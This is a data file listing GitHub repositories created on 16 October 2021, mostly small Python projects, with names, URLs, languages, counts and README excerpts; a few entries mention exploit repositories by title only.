417914283;Hesap-Makinesi;https://github.com/HasanSaidTamer/Hesap-Makinesi;;2021-10-16T18:30:30Z;0;0;0;Hesap-Makinesi Python İle Basit Bir Hesap Makinesi Projesi :) 
417914645;magi-rest-api;https://github.com/revoxhere/magi-rest-api;Python;2021-10-16T18:31:58Z;0;0;0;magi-rest-api Coin Magi 2021 REST & RPC Python API Docs available at magi.duinocoin.com/api 
417957401;tutorial-pybr;https://github.com/Karinecasant/tutorial-pybr;;2021-10-16T21:53:47Z;0;0;0;tutorial-pybr Building an API with python and fastapi 
417889773;Internship--2021;https://github.com/scraaman/Internship--2021;Jupyter Notebook;2021-10-16T16:51:14Z;0;0;0;
417887262;TextBasedRPG;https://github.com/woldman456/TextBasedRPG;Python;2021-10-16T16:40:33Z;0;0;0;TextBasedRPG a test based RPG in python 
417892356;space-invaders;https://github.com/ajloinformatico/space-invaders;;2021-10-16T17:01:35Z;0;0;0;
417894493;hello;https://github.com/SavchukEvgeniy/hello;;2021-10-16T17:09:43Z;0;0;0;
417909681;calculator;https://github.com/NikStor03/calculator;Python;2021-10-16T18:10:03Z;1;1;0;Calculator Calculator developed in Python and Tkinter How calculator looks  
417927723;RAC-Django;https://github.com/19smabtahinoor/RAC-Django;JavaScript;2021-10-16T19:31:33Z;1;1;0;
417931180;VK_Backend_Homeworks;https://github.com/grigorevmp/VK_Backend_Homeworks;Python;2021-10-16T19:48:09Z;0;0;0;VK_Backend_Homeworks Repository for homework for VK Education Backend course Fall 2021 
417895587;Factorial-Calculator;https://github.com/tnhenga/Factorial-Calculator;Python;2021-10-16T17:14:10Z;0;0;0;
417971220;Botel;https://github.com/spider863644/Botel;Python;2021-10-16T23:21:43Z;0;0;0;Botel Bot created by spider also made with python Botel is a bot that teaches hacking and programming How to install: $ apt update && apt upgrade $ apt install git $ apt install python3 $ git clone https://github.com/spider863644/Botel $ cd Botel $ python3 Botel.py NOTE: Follow me on github 
417967233;DSA-Lab-3-Q2-Balancing-Parantheses-using-stack-in-Python;https://github.com/4833R11Y45/DSA-Lab-3-Q2-Balancing-Parantheses-using-stack-in-Python;Python;2021-10-16T22:54:54Z;0;0;0;
417972508;Rede-neural-convolucional-para-classificacao-de-imagens-com-Python-TensorFlow-e-Keras;https://github.com/FGalvao77/Rede-neural-convolucional-para-classificacao-de-imagens-com-Python-TensorFlow-e-Keras;Jupyter Notebook;2021-10-16T23:31:26Z;0;0;0;Rede neural convolucional para classificação de imagens com Python, TensorFlow e Keras No aprendizado profundo, uma rede neural convolucional é uma classe de redes neurais profundas que têm sido usadas com grande sucesso em tarefas de visão computacional, como classificação de imagens, detecção de objetos, segmentação de imagens, ... Os neurônios em uma camada convolucional não estão totalmente conectados a cada pixel na imagem de entrada, como em uma rede neural tradicional. Em vez disso, eles são conectados a um pequeno retângulo de pixels na imagem de entrada. Por sua vez, cada neurônio da segunda camada convolucional está conectado apenas a outros neurônios localizados em uma região específica da primeira camada. Com essa arquitetura, o modelo só precisa se concentrar nos pequenos detalhes da primeira camada oculta, como bordas, e depois montá-los em recursos mais elaborados na segunda camada e assim por diante. Além disso, isso fará com que a rede neural convolucional tenha muito menos parâmetros do que uma rede totalmente conectada, útil para processar imagens de grande porte. 
417936926;hangman;https://github.com/Jeramir1/hangman;Python;2021-10-16T20:10:57Z;0;0;0;
417960853;data-extraction;https://github.com/Prashantguptanz/data-extraction;Python;2021-10-16T22:12:09Z;0;0;0;data-extraction Python script to extract host-virus articles from various databases 
417970088;pyriddle;https://github.com/mohamed/pyriddle;;2021-10-16T23:13:31Z;0;0;0;
417890319;py-words-permuting;https://github.com/Santi72Alc/py-words-permuting;Python;2021-10-16T16:53:36Z;0;0;0;py-words-permuting Info Las palabras deben estar guardas en un fichero de texto plano. Al ejecutar el programa se solicitará el nombre de este fichero. Las palabras indicadas en este fichero estarán almacenadas en una misma línea y deben estar separadas entre ellas por un espacio y Si se desea bloquear alguna, se antepondrá un asterisco (*) a dicha palabra. SÓLO se permite 1 línea de palabras Ejemplo: palabra1 palabra2 *palabra3 palabra4 *palabra5 (Las palabras 'palabra3' y 'palabra5' NO serán movidas de su posición ni contempladas para las permutaciones) 
417889866;Data-Science;https://github.com/R-u-z-a/Data-Science;Jupyter Notebook;2021-10-16T16:51:35Z;0;0;0;Data-Science Библиотеки Python для Data Science: Numpy, Matplotlib, Scikit-learn 
417967547;Smart_Alarm;https://github.com/JSzafarski/Smart_Alarm;Python;2021-10-16T22:57:12Z;0;0;0;
417922419;apPETite-package-V1;https://github.com/UIUCiGEM/apPETite-package-V1;Python;2021-10-16T19:08:20Z;0;0;0;apPETite-package Home to our custom and fully customizable package that can be used to generate new protein or enzyme sequences! Package Description and Functions construct_diwv()  This function returns a dictionary that maps pairs of amino acids to an instability score based on the ProtParam Instability Index. The index is included, but you are welcome to use any other index.  passes_filters()  This function creates filters that will be used on the generated novel protein sequences and let those that satisfy the filter’s specifications return as a valid sequence. This function currently has filters for sequence length and sequence stability and instability. These filters can be modified accordingly for your protein or enzyme, and you can also add your own filters for any other property that you are interested in analyzing.  run_rnn()  This is the main function that takes an input of training sequences, and will return new sequences based on the specified filters from passes_filters(). This function has the most adaptability, as you can adjust any of the parameters involved here to whatever you’d like. The ones we used specifically for our PETase work are included here.  
417922829;Recipes;https://github.com/Oliver-Weiss/Recipes;Python;2021-10-16T19:10:22Z;0;0;0;RECIPES This is a small application created for an assignment on Coding Dojo's Python Course to go over what I've learned so far. The next thing to be uploaded will be a project with a far more detailed README attached! 
417937600;PyWitch;https://github.com/ouriquegustavo/PyWitch;Python;2021-10-16T20:14:08Z;0;0;0;PyWitch Connect to Twitch using Python requests and websocket! 
417918675;Guess-the-number-game;https://github.com/MukitoZ/Guess-the-number-game;Python;2021-10-16T18:50:44Z;0;0;0;
417893346;Kafay_API;https://github.com/SenuGamerBoy/Kafay_API;Python;2021-10-16T17:05:18Z;0;0;0;Kafay_API 
417935077;augustine-text;https://github.com/kajuberdut/augustine-text;Python;2021-10-16T20:03:07Z;0;0;0;            augustine      Simple text generation with document training.      Table of Contents   About The Project   Getting Started  Usage  Additional Documentation   Roadmap Contributing License Contact   About The Project Augustine is a fairly simple text generation library. The name is taken from St. Augustine of Hippo, the most prolifict of early church writers.  No hard dependencies 100% pure python Simple Works out of the box Extensible to mimic specific documents  Getting Started To get a local copy up and running follow these simple steps. Installing with pip pip install augustine_text For information about cloning and dev setup see: Contributing Usage Here is an example showing basic usage. from augustine_text.sample_text import words   # 75K words of procedurally generated text # This is about the length of novel. text = words(75000) text_length = len(text)   print(text[:100]) Contributing Contributions are what make the open source community such an amazing place to be learn, inspire, and create. Any contributions you make are greatly appreciated.  Fork the Project Create your Feature Branch (git checkout -b feature/AmazingFeature) Add tests, we aim for 100% test coverage Using Coverage Commit your Changes (git commit -m 'Add some AmazingFeature') Push to the Branch (git push origin feature/AmazingFeature) Open a Pull Request  Cloning / Development setup  Clone the repo and install git clone https://github.com/kajuberdut/augustine-text.git cd augustine pipenv install --dev  Run tests pipenv shell ward   For more about pipenv see: Pipenv Github License Distributed under the BSD Two-clause License. See LICENSE for more information. Contact Patrick Shechet - patrick.shechet@gmail.com Project Link: https://github.com/kajuberdut/augustine 
417970822;docker_test;https://github.com/DylanEHolland/docker_test;;2021-10-16T23:18:37Z;0;0;0;
417957535;Password-Manager;https://github.com/Lucchese-Anthony/Password-Manager;Python;2021-10-16T21:54:46Z;0;0;0;Password Manager This is a password manager written in python, with no front-end interface. The program involves base64 encrypting and decrypting, use of a salt in password encryption, and no user interaction with the encryption or the password storing.} 
417898402;kbhit;https://github.com/lvlte/kbhit;Python;2021-10-16T17:25:03Z;0;0;0;kbhit A Python class implementing KBHIT, the standard keyboard-interrupt poller. 
417888078;opensea-nft-api-tutorial;https://github.com/hackingthemarkets/opensea-nft-api-tutorial;Python;2021-10-16T16:43:57Z;1;1;0;opensea-nft-api-tutorial OpenSea NFT API App using Python and Streamlit Tutorial Video Walkthrough https://www.youtube.com/watch?v=49SupvcFC1M Instructions for Running pip3 install -r requirements.txt streamlit run nft.py  cli.py and assets.json This is a flat file of all assets in a collection. Since OpenSea NFT only lets you fetch 50 assets at a time, you can run cli.py to fetch all assets page by page and output the final data structure into a file called assets.json. The nft.py webapp reads in this data and performs the trait and rarity sort. 
417953237;artificical_antibody_network;https://github.com/watermeloniiiii/artificical_antibody_network;Python;2021-10-16T21:31:36Z;0;0;0;artificical_antibody_network This is the python implementation of the artificial antibody network 
417932350;Matrizes-Esparsas;https://github.com/mtheuz/Matrizes-Esparsas;Python;2021-10-16T19:52:40Z;0;0;0;
417896702;translation_application;https://github.com/TobbyEchonga/translation_application;Python;2021-10-16T17:18:42Z;0;0;0;Translation Application simple python application to translate english to french  Output result  
417900352;PolynomialCalculator;https://github.com/tnhenga/PolynomialCalculator;Python;2021-10-16T17:32:21Z;0;0;0;
417909588;farmstack_project;https://github.com/joshivignesh/farmstack_project;Python;2021-10-16T18:09:39Z;0;0;0;farmstack_project Farm Stack Project using Python, FastAPI, React, MongoDB First create a MongoDB Instance using MongoDB Atlas pip install pipenv pipenv shell -- For creating Successfully created virtual environment! C:\Users\username.virtualenvs\backend-4gb77sK_ requirements.txt found, instead of Pipfile! Converting... pipenv install -r requirements.txt Success! Updated Pipfile.lock (aef8e9)! Installing dependencies from Pipfile.lock To run Python App uvicorn main:app --reload 
417953546;exploits;https://github.com/NotFoundHacker/exploits;Python;2021-10-16T21:33:11Z;0;0;0;ExploitC This is a repository full of C scripts and python 
417924381;Drupalgeddon3;https://github.com/0xBruno/Drupalgeddon3;Python;2021-10-16T19:16:57Z;0;0;0;Drupalgeddon3 Drupal < 7.58 - 'Drupalgeddon3' Authenticated Remote Code Execution (Python 3) 
417901801;DS_ML-Project;https://github.com/iamkeetarp/DS_ML-Project;Jupyter Notebook;2021-10-16T17:38:32Z;0;0;0;
417891986;ImageDecomposition;https://github.com/futuretide/ImageDecomposition;Python;2021-10-16T17:00:32Z;0;0;1;
417882160;RandomNumber.py;https://github.com/amit0693/RandomNumber.py;Python;2021-10-16T16:19:53Z;0;0;0;
417891028;TernaryPrism;https://github.com/parikshitbajpai/TernaryPrism;;2021-10-16T16:56:26Z;0;0;0;TernaryPrism Implements 3D ternary plots for Python using Matplotlib 
417921928;minimax_algorithm;https://github.com/s25429/minimax_algorithm;Python;2021-10-16T19:06:03Z;0;0;0;Minimax Algorithm in Python  Minimax algorithm wrote in Python as a tic-tac-toe game.  Table of Contents  General Info Technologies Used Setup Usage Project Status Room for Improvement Contact  General Information  It is a simple made-by-me minimax algorithm fitted into a game of tic-tac-toe. It is written in Python and does not use any libraries that need to be installed via pip. Idea was to try writing more of a real algorithm, seeing how well I can do. It seems to work rather well and through my testing I have not noticed any issues. Although it seems to work well, other algorithms seem to win a game of tic-tac-toe more often. My algorithm might be under-performing, but not sure on that. It currently does not use alpha-beta prunning.  Technologies used  Python 3.7+  Setup Simply copy the repository and run python main.py with at least Python 3.7. It uses dataclasses, which after version 3.7 were added as a built-in library to python. Nothing else is needed. Usage  After launch you will be prompted to choose players. Your options are HUMAN, AI-EASY and AI-HARD. AI-EASY chooses spots at random. AI-HARD uses the algorithm. Next you will be asked to choose algorithm search depth if you had chosed hard ai. Usually numbers between 6 and 10 work best. After that you will be able to play! Simply type in the number of your preferred cell when prompted and get ready to be squashed by the AI! Or vice versa.  Project Status Project is complete, but might receive update if I will feel like improving on it. Room for Improvement  Alpha-beta prunning Optimizing the code itself more Some GUI? Would require an external library.  Contact Created by s25429 AKA ThatHoracy, but currently posted on an account using school email address (this one!)  Email: s25429@pjwstk.edu.pl  
417927507;Traductor_a_morse;https://github.com/AlmartDev/Traductor_a_morse;;2021-10-16T19:30:42Z;0;0;0;
417906480;brownie_fund_me;https://github.com/MarkBilginer/brownie_fund_me;Solidity;2021-10-16T17:57:36Z;0;0;0;
417940018;fastapi-test-task;https://github.com/hnthh/fastapi-test-task;Python;2021-10-16T20:25:27Z;0;0;0;
417911451;Tic-Tac-Toe-V2;https://github.com/CoachAlpha/Tic-Tac-Toe-V2;Python;2021-10-16T18:17:48Z;0;0;0;Tic-Tac-Toe-V2 This new version of tic tac toe has AI and now you can play it alone with your computer as your opponent. This version is much faster and the AI is very powerful and the chances of winning against it are 20% to 80%. The winner IF YOU CAN WIN AGAINST THE AI SEND ME THE PICTURE TO MY INSTAGRAM AND I WILL GIVE YOU A PRICE. Created By AlPHA With ❤️ requirements : Python 3 
417972163;AuraNet;https://github.com/thecodeavenger/AuraNet;Python;2021-10-16T23:29:01Z;0;0;0;AuraNet A decentralized Network System 
417910821;Qr_Code_Creator;https://github.com/GeovaniTech/Qr_Code_Creator;Python;2021-10-16T18:15:11Z;0;0;0;QrCode Creator  Status: Finished✔️  Qr code generator with graphical interface! Technologies/Frameworks:  Python Qt Designer Qrcode - main framework Tkinter  Interface Without Link  Interface With Link  
417877742;flatype;https://github.com/FlaCorp/flatype;Dockerfile;2021-10-16T16:03:24Z;2;2;0;DevOps Flatype DevOps services for @Flaiers/flatype 
417905034;DonationsProcessed;https://github.com/tnhenga/DonationsProcessed;Python;2021-10-16T17:51:34Z;0;0;0;
417957551;bitey;https://github.com/jgerrish/bitey;Python;2021-10-16T21:54:52Z;0;0;0;bitey  Bitey is a 6502 CPU emulator.  It is currently not feature-complete, cycle-accurate or any of those things.  It's meant to be a simple clean emulator for a classic chipset.  It may possibly be expanded to include emulation of 8-bit systems in the future. It uses a simple JSON format for describing the CPU architecture. Why not VHDL or Verilog or insert-hardware-description-language? I'm not an electrical engineer.  I don't have access to the common simulation environments or experience working with the intricacies of those languages.  JSON provides a middle-ground between most existing classic 8-bit emulators and full-blown hardware definition in a language. The target audience of this application is those who want a simple understanding of emulation and a clean-ish base to work from. There are some existing projects that are more focused on those design patterns. Apple2fpga by Stephen A. Edwards at Columbia Univeristy http://www.cs.columbia.edu/~sedwards/apple2fpga/ AppleLogic includes links to other projects. http://www.applelogic.org/ AppleIIe for MiSTer https://github.com/MiSTer-devel/Apple-II_MiSTer FPGA-64 https://www.syntiac.com/fpga64.html I haven't examined all of these, but I'm pointing them out for those who are more interested in a more formal approach. Install pipenv was used to setup dependencies.  Feel free to use your Python package-manager of choice.  A Pipfile is included for installing dependencies. $ pip install -U pipenv $ pipenv install $ pipenv shell Running $ python -m bitey.app Development Design There are some design decisions that were implemented that may seem inconsistent. First, ordering of parameters in the Register, Flag and Instruction classes differs.  For Register and Flag, short_name and name are first, followed by size or bit_field_pos.  For the Instruction class, name and opcode are first, followed by description. It's called the description field instead of short_name and name because the name of the instruction is for example LDA.  This inconsistency may be changed later. The opcode field comes before the description field because name and opcode are the two primary elements used when manipulating instructions. Bus Design Most of the components, like instructions, flags and registers had simple designs.  The CPU buses provided different design challenges:  The model should be simple and not introduce synchronization / concurrency issues. The API should be easy to understand.  The requirements are that the CPU should be able to request items (instructions or data) from memory and get those items back.  And it should be able to write data to memory locations.  Research needs to be done on the synchronization requirements and how the true hardware deals with this (clocks, etc). Tests To run tests: $ pipenv run python -m pytest Linting This package uses black and flake8 for linting and style checking. I'm not strict on some of the recommended lints, but you can run them if you want. $ pipenv run flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics $ pipenv run flake8 . --count --exit-zero --max-complexity=10 --max-line-length=127 --statistics $ pipenv run black --check --diff . Focus is on making sure the tests run. 
417954545;restock-checker;https://github.com/ethantiger/restock-checker;Python;2021-10-16T21:38:31Z;0;0;0;What you need  Install Selenium Download Chrome Webdriver to C:\Program Files (x86)\chromedriver.exe Download win10toast_click  What it does The code is not an auto-purchaser. This code only checks to see whether ps5's or xbox's are in stock and will send a notification to your computer if either one is available. The code will end if either one is available. 
417909189;pypowerwall;https://github.com/jasonacox/pypowerwall;Python;2021-10-16T18:08:02Z;0;0;0;"pyPowerwall   Python module to interface with Tesla Energy Gateways for Powerwall and solar power data. Description This python module can be used to monitor and control Tesla Energy Gateway Powerwalls. It uses a single class (Powerwall) and simple functions to fetch energy data and poll API endpoints on the Gateway. pyPowerwall will cache the authentication headers and API call responses for up to 5s to help reduce the number of calls made to the Gateway (useful if you are polling the Powerwall frequently for trending data).  Works with Tesla Energy Gateways - Powerwall+ Simple access through easy to use functions using customer credentials Will cache authentication to reduce load on Powerwall Gateway Will cache responses for 5s to limit number of calls to Powerwall Gateway  NOTE: This module requires that you (or your installer) have set up customer credentials on your Powerwall Gateway. Setup You can clone this repo or install the package with pip.  Once installed, pyPowerwall can scan your local network to find th IP address of your Tesla Powerwall Gateway. # Install pyPowerwall python -m pip install pypowerwall  # Scan Network for Powerwalls python -m pypowerwall scan Programming with pyPowerwall After importing pypowerwall, you simply create a handle for your Powerwall device and call function to poll data.  Here is an example:     import pypowerwall      # Optional: Turn on Debug Mode     # pypowerwall.set_debug(True)      # Credentials for your Powerwall - Customer Login Data     password='password'     email='email@email.com'     host = ""10.0.1.123""               # Address of your Powerwall Gateway     timezone = ""America/Los_Angeles""  # Your local timezone       # Connect to Powerwall     pw = pypowerwall.Powerwall(host,password,email,timezone)      # Pull Sensor Power Data     grid = pw.grid()     solar = pw.solar()     battery = pw.battery()     home = pw.home()      # Display Data     print(""Battery power level: %0.0f%%"" % pw.level())     print(""Combined power metrics: %r"" % pw.power())     print("""")      # Display Power in kW     print(""Grid Power: %0.2fkW"" % (float(grid)/1000.0))     print(""Solar Power: %0.2fkW"" % (float(solar)/1000.0))     print(""Battery Power: %0.2fkW"" % (float(battery)/1000.0))     print(""Home Power: %0.2fkW"" % (float(home)/1000.0))     print("""")      # Raw JSON Payload Examples     print(""Grid raw: %r\n"" % pw.grid(verbose=True))     print(""Solar raw: %r\n"" % pw.solar(verbose=True)) pyPowerwall Module Class and Functions  Classes     Powerwall(host, password, email, timezone)   Functions      poll(api, jsonformat)   # Fetch data from Powerwall API URI (return json if True)     level()                 # Fetch battery power level percentage     power()                 # Fetch power data returned as dictionary     site(verbose)           # Fetch site sensor data (W or raw json if verbose=True)     solar(verbose):         # Fetch solar sensor data (W or raw json if verbose=True)     battery(verbose):       # Fetch battery sensor data (W or raw json if verbose=True)     load(verbose)           # Fetch load sensor data (W or raw json if verbose=True)     grid()                  # Alias for site()     home()                  # Alias for load()  Credits and References  Tesla Powerwall 2 – Local Gateway API documentation – https://github.com/vloschiavo/powerwall2 Python Tesla Powerwall API – https://github.com/jrester/tesla_powerwall TESLA PowerWall 2 Security Shenanigans – https://github.com/hackerschoice/thc-tesla-powerwall2-hack Powerwall Monitoring – https://github.com/mihailescu2m/powerwall_monitor  "
417910095;JOB_SCRAPPER;https://github.com/aniksen0/JOB_SCRAPPER;Python;2021-10-16T18:11:57Z;0;0;0;
417930397;election-analysis;https://github.com/alex-keigley/election-analysis;Python;2021-10-16T19:44:13Z;0;0;0;Election Audit (election-analysis) Python challenge project to provide analysis of a .csv file containing a list of ballots. Overview of Election Audit The purpose of this audit is to quickly tally the ballots in the included .csv file in order to provide a breakdown of the voting results by both canidate and county. During the breakdown we also present the winning canidate, along with the county with the highest voter turnout. Election Audit Results  How many votes were cast in this congressional election?  Provide a breakdown of the number of votes and the percentage of total votes for each county in the precinct.  Which county had the largest number of votes?  Provide a breakdown of the number of votes and the percentage of the total votes each canidate recieved.  Which canidate won the election, what was their vote count, and what was their percentage of the total votes?   Election Audit Summary To summarize, this script is already capable of quickly tallying votes and sorting those votes by county. As the script stands currently it could be used in any election where the data is available to be sorted to include county information in addition to canidate voted for. The script could also easily be modified to work without counties being provided. In addition, the script could be expanded upon to show information such as which canidate has the highest vote count in each county, as well as many other statistics. 
417912061;Ping-range-of-IP-s;https://github.com/DeVogelRyan/Ping-range-of-IP-s;Python;2021-10-16T18:20:42Z;0;0;0;Ping range of IP's This is a small script written in Python that allows you to ping a range of ip addresses.  How to setup: git clone https://github.com/DeVogelRyan/Ping-range-of-IP-s cd Ping-range-of-IP-s python main.py  
417919422;Portfolio;https://github.com/dyakubowski/Portfolio;;2021-10-16T18:54:38Z;0;0;0;Portfolio My practical tasks, mini-projects for future resume as Python Developer 
417905981;SearchContactsProgram;https://github.com/tnhenga/SearchContactsProgram;Python;2021-10-16T17:55:40Z;0;0;0;
417925651;Vision-recognition-Tkinter;https://github.com/kjdv91/Vision-recognition-Tkinter;Python;2021-10-16T19:22:43Z;0;0;0;
417916161;bfs_gui;https://github.com/aatuv/bfs_gui;Python;2021-10-16T18:38:52Z;0;0;0;Breadth-First Search Graphical User Interface A program for interactively visualizing the breadth-first search (BFS) algorithm. The user can draw obstacles and a destination node to a canvas grid. The algorithm TODO:  Implement the basic BFS algorithm Figure out the best way how the algorithm could work with the resulting matrix from the user's drawing  The UI TODO:  Add function for resetting drawing of obstacles Add function for adding a target node Add function for starting the BFS algorithm  
417879868;fast_api;https://github.com/Gonzalo6282/fast_api;Python;2021-10-16T16:10:55Z;0;0;0;fast_api 
417939718;voice-to-text;https://github.com/peksinsara/voice-to-text;Python;2021-10-16T20:24:01Z;0;0;0;voice-to-text ﻿#run ﻿pip install requirements.txt 
417954869;Projeto-Mercado;https://github.com/FelipeECarvalho/Projeto-Mercado;Python;2021-10-16T21:40:20Z;0;0;0;PROJETO MERCADO Ele consiste na integração entre Python e o banco de dados relacional MySQL, para criar um sistema PDV, dos caixas de supermercado. 
417936383;Alien-Invasion-by-Varmilo;https://github.com/VarmiloVA/Alien-Invasion-by-Varmilo;Python;2021-10-16T20:08:40Z;1;1;0;
417885086;MacLabelPrint;https://github.com/fnmalik2002/MacLabelPrint;Python;2021-10-16T16:31:31Z;0;0;0;"MacLabelPrint  Create a formatted label and print it on macOS and Python 3. You can control label size, text size, text location on label and text weight using this module. The newly constructed modules will be displayed on your screen alongside a print button which will print the label to your Mac's default printer without opening   printer options dialogue box. Call this label creator from inside your python code. You can put the label constructor code inside a button click method in your python gui app. Import and construct label object to print Method 1  from MacLabelPrint import MyLabel as pl  pl(None, lable_data_as_dictionary, label_width, label_height)  or  pl(None, lable_data_as_dictionary)  Method 2  import MacLabelPrint as pl  pl.MyLabel(None, lable_data_as_dictionary, label_width, label_height)  or  pl.MyLabel(None, lable_data_as_dictionary)   What should be in label_data dictionary? Each key:value pair represents one line of text on label key can be any string but value has to be a list with items in this order ""label text string"", string distance from left, string distance from top, font size, font weight font weight can be just the number 400 for normal text or wx.FONTWEIGHT_NORMAL without quotes around it font weight can be just the number 700 for bold text or wx.FONTWEIGHT_BOLD without quotes around it   label_data = {      ""ln1"" : [""line 1 bold text here"", 20, 20, 16, 700]     ""ln2"" : [""line 2 bold here"", 20, 40, 16, wx.FONTWEIGHT_BOLD]     ""ln3"" : [""line 3 normal text here"", 20, 60, 16, 400]     ""ln4"" : [""line 4 normal here"", 20, 80, 16, wx.FONTWEIGHT_NORMAL]  }   IMPORTANT Make sure if you set label sizes to be width=400 and height=600 then in your printer settings page (using Safari on localhost:631) change defaults to paper size 4.00 x 6.00 "
417974791;yaml_dip;https://github.com/jpegleg/yaml_dip;Python;2021-10-16T23:48:28Z;0;0;0;"yaml_dip 🌶️ 🍅 🦅 An HTTPS client app template in python with requests module, built for the salsa_falcon. See https://github.com/jpegleg/salsa_falcon This is a template, edit it from here for a real use. Probably want to make that api token something more useful. Replace mycoolsalsafalcon in the template with your salsa_falcon server DNS name or IP. Replace the URI context /api/encrypt/1 etc, with the URI contexts you configure in your salsa_falcon routes. This client template takes in a YAML file called struct.yml which defines encryption and decryption salsa falcon endpoints as well as data to encrypt and decrypt. The program could be expanded to have multiple yaml files loaded and processed etc. This example has two client threads to two different salsa_falcon servers, encrypting some strings. Even with the salsa_falcon being remote, the speed is good. $ python yaml_dip.py 2021-10-17 00:14:26.107058 -> Loaded struct1.yml for salsa20... 2021-10-17 00:14:26.107171 <- Sending to salsa falcon. 2021-10-17 00:14:26.111168 -> Loaded struct2.yml for salsa20... 2021-10-17 00:14:26.111194 <- Sending to salsa falcon. 2021-10-17 00:14:26.375488 df0178797551 -> Recv thread 2 output:  b'e96a1c9e2f2d7a3a411eed767b0969d1334885e48def18723d79a628f90f659c525a2b0404c4ae154d4abbdd79fb832b217de087765825fffff23ffff726f53519d15c8ac4eb50f19c0f5a2e' 2021-10-17 00:14:26.519678 df0178797551 -> Recv thread 2 output:  b'1444f0c324cc4f23aa8792642a' 2021-10-17 00:14:26.530474 950d29aeba1a -> Recv thread 1 output:  b'39323963306537366631356431343432323964333230' 2021-10-17 00:14:26.664828 df0178797551 -> Recv thread 2 output:  b'425ed87f679cba4a0189803a508161' 2021-10-17 00:14:26.748891 950d29aeba1a -> Recv thread 1 output:  b'306462366132613437626365626363633638363230306138' 2021-10-17 00:14:26.809334 df0178797551 -> Recv thread 2 output:  b'42012809259659f32f1dc8fdddefcce805cccd3b3786efea251d4cfd1bb7459dc09f5b09ab6fb9b1775bb1aac355d2b415407d72f9bce7767be976eb894782' 2021-10-17 00:14:26.962262 950d29aeba1a -> Recv thread 1 output:  b'366361303938313466633435383335363736336165626130646534393136' 2021-10-17 00:14:27.170391 950d29aeba1a -> Recv thread 1 output:  b'3733623265373031616639393164343966333438' 2021-10-17 00:14:27.385008 950d29aeba1a -> Recv thread 1 output:  b'356337303966613635396331376537643131343337303235396236663831376432356331333931326539633964383162346633336438316138376638376264633335333538393632616364663363336163346234376635613931306134633632346132646535376537356564346134323837303638386565373133313436646266333232643534666661353634303939326364356237353338363961343337633465323663306630' 2021-10-17 00:14:27.599081 950d29aeba1a -> Recv thread 1 output:  b'356339646637373166626661613238366332613139376362616139363033326463386462326530323362323566646239346230386531313664663933366561636433666163653335376564323235373266626239386535393039643561646338316332376130373933356330393937626566623434323265383039323365326563303362633139643838353932343863353963373161323432633731376362616562666437383365' 2021-10-17 00:14:27.814579 950d29aeba1a -> Recv thread 1 output:  b'3838663630656664393236373830386134323461356430353932313434363033333563646130306237646236376439383737396236303635323533353862366330356439303061346236663336343035663739346565643037353963313861646234376631633933363536623738323236613238316562646239306565353031623932333339373666656330306130376464643738663931' 2021-10-17 00:14:28.028348 950d29aeba1a -> Recv thread 1 output:  b'663037393464616430373561366662646163313638633865323830623735303237656366353766396262353364316164313164346566666362336166383261663962393834323131386430313333303634353435666463313139623665626461323263393932313639666332353630646365336632653766303232343233376432323965623239636239303161653730393339616631353739333930633363313966373634396665' 2021-10-17 00:14:28.245654 950d29aeba1a -> Recv thread 1 output:  b'34396635316637656537373164383032326232396162373861626538383666306231653765656337' 2021-10-17 00:14:28.471847 950d29aeba1a -> Recv thread 1 output:  b'38316166356165356430373435633630366539633338313532633066313865336231653536643430383437393036393637646532343235386363626566643732373561633136396162656565636439653337623762633531' 2021-10-17 00:14:28.695111 950d29aeba1a -> Recv thread 1 output:  b'356134356364616366396531323134663037633530653434303333393863343234656464353437346639333736333266353631653631653532356235356665363063626134643335666465313363393935653361353431393436393135613436393233636134323231623664666435353333366563323136643633613838643330356237646533313133643238326237316261333432633061326539623365396238653530346238' $   Note the second column of the output is a truncated SHA256 of the falcon server URI context used. The purpose of this is for tracking and audit, without exposing the URI context of the falcon route to the output. That hash is only truncated to save disk space in the output, you can remove the truncate and print the full SHA256 if you like. Change urihash[0:12] to urihash in the code to print the full hash value. The segments to decrypt are defined as eseg while the data segments to encrypt are labelled datasegment: --- salsamixer:    name:     - ""do salsa20 on some YAML values""   executions:     HONKSET:       datasegment:         - ""Honk honk honk""       eseg:         - 52e323fc8d924e2290f02ceb       salsafalconE:         - ""https://mycoolsalsafalcon/api/encrypt/1""       salsafalconD:         - ""https://mycoolsalsafalcon/api/decrypt/funtimeswithuricontexts"" ...     You can have any number of executions and it will iterate through them: --- salsamixer:    name:     - ""do salsa20 on some YAML values""   executions:     HONKSET:       datasegment:         - ""Honk honk honk""       eseg:         - 52e323fc8d924e2290f02ceb       salsafalconE:         - ""https://mycoolsalsafalcon/api/encrypt/1""       salsafalconD:         - ""https://mycoolsalsafalcon/api/decrypt/funtimeswithuricontexts""     HONKSET2:       datasegment:         - ""Honk honk honk honk honk honk 2""        eseg:         - 52e323fc8d924e2290f02ce1        salsafalconE:         - ""https://mycoolsalsafalcon/api/encrypt/2""        salsafalconD:         - ""https://mycoolsalsafalcon/api/decrypt/funtimeswithuricontexts2""         ...     If you only want to decrypt or only want to encrypt, just leave out the YAML keys you don't need: --- salsamixer:    name:     - ""do salsa20 on some YAML values""   executions:     HONKSET:       datasegment:         - ""Honk honk honk""         - ""More things, encoded images, whatevs.""         - ""Further things we want to send around.""       salsafalconE:         - ""https://mycoolsalsafalcon/api/encrypt/1""     HONKSET2:       datasegment:         - ""Honk honk honk honk honk honk 2""       salsafalconE:         - ""https://mycoolsalsafalcon/api/encrypt/1""         - ""https://mycoolsalsafalcon/api/encrypt/2""      ...   The salsa falcon/s used could be local and/or remote. I like to have remote salsa falcons with encrypt only set ups, and put the decrypt api elsewhere. This creates nice control over the decryption mechanism and more importantly, the secret key and the ability to decrypt is never on the client or build systems, even if the original plaintext is on disk when the YAML stream is loaded. "
417901034;basicbintree;https://github.com/waltertross/basicbintree;;2021-10-16T17:35:24Z;0;0;0;basicbintree a basic binary tree Python library, with a simple ASCII print_tree() 
417936642;pygame;https://github.com/fapers/pygame;Python;2021-10-16T20:09:41Z;0;0;0;pygame Repositório para armazenamento dos códigos de games com Python utilizando a biblioteca pygame.  Instale o python no windows e adicione uma variável de ambiente. Entre nas propriedades do computador e procure configurações avançadas do sistema, na janela que se abre procure por variáveis de ambiente e depois no tópico variáveis do sistema procure por Path, dê dois cliques e adicione os caminhos de instalação do Python:  -> C:\Users\name_user\AppData\Local\Programs\Python\Python310 -> C:\Users\name_user\AppData\Local\Programs\Python\Python310\Scripts  Abra o explorer e importe o repositório do github para um local no computador. Abra o terminal windows na pasta desejada e digite: git clone https://github.com/fapers/pygame.git  
